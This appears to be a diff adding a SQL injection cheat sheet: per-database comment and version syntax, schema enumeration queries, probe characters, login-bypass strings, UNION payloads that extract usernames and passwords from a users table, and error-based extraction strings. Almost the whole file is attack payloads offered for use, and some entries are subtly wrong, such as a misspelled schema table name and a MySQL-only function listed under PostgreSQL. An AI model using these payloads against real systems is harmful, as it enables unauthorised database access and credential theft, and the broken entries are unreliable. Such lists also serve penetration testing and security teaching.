@@ -1,0 +1,74 @@
+Comments:
+Oracle 	--comment
+Microsoft 	--comment  /*comment*/
+PostgreSQL 	--comment  /*comment*/
+MySQL 	#comment  -- comment [Note the space after the double dash]   /*comment*/  
+                                                                                    
+Database version:
+ Oracle 	SELECT banner FROM v$version  |  SELECT version FROM v$instance
+Microsoft 	SELECT @@version
+PostgreSQL 	SELECT version()
+MySQL 	SELECT @@version 
+
+Listing the contents of the database:
+SELECT schema_name FROM information_schema.shemata  
+SELECT table_name FROM information_schema.tables where table_schema='xx'
+SELECT column_name FROM information_schema.columns where table_name='xx'
+
+                                                                                   IN-BAND INJECTION:
+                                                                                    
+ERROR-BASED INJECTION:                                                                                    
+Detecting the vulnerability:
+'
+“
+‘)
+‘))
+“))
+/
+;
+//
+\
+-- -  
+\'
+--+
+-1
+)'  
++--+
+
+Login Bypassing:
+admin’    #
+admin”    #
+admin’))    #
+‘ or 1=1    --+
+‘ or 1=1    #
+" or "        " "
+" or true    --
+" or true    --+
+‘)) or true    -- -
+admin'  or 1=1 or ''='
+admin') or ('1'='1'--
+admin') or '1'='1'/*
+admin") or "1"="1
+') or ('1'='1    --  
+
+Union Based:
+Determining the number of columns required in a SQL injection UNION attack:
+' ORDER BY 1--  |  ' ORDER BY 2--  |  ' ORDER BY 3--  etc.  
+' UNION SELECT NULL--  |  ' UNION SELECT NULL,NULL--  |  ' UNION SELECT NULL,NULL,NULL--  etc.  
+
+Finding columns with a useful data type in a SQL injection UNION attack:
+' UNION SELECT 'a',NULL,NULL,NULL--  |  ' UNION SELECT NULL,'a',NULL,NULL--  |  ' UNION SELECT NULL,NULL,'a',NULL--  |  ' UNION SELECT NULL,NULL,NULL,'a'-- 
+  
+Using a SQL injection UNION attack to retrieve interesting data:  
+' UNION SELECT username, password FROM users--  
+Retrieving multiple values within a single column:
+' UNION SELECT username || '~' || password FROM users--
+  
+                                                                                   BLIND INJECTION:
+    
+Extracting sensitive data via verbose SQL error messages:   
+Microsoft    ' and CAST((SELECT example_column FROM example_table) AS int) --       |       ' AND 1=CAST((SELECT password FROM users limit 1) AS int)--         
+PostgreSQL 	 ' and SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+
+
+
